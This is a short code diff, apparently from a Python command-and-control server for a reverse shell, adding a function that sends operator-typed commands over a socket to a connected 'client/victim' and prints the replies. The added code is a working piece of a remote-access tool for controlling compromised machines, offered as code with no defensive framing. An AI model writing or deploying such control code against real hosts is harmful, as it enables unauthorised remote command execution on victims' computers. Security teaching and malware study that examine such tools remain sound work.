@@ -113,3 +113,19 @@ def get_target(cmd):
     except:
         print("Selection not valid")
         return None
+    
+# send commands to client/victim
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                conn.close()
+                s.close()
+                sys.exit()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(1024), 'utf-8')
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
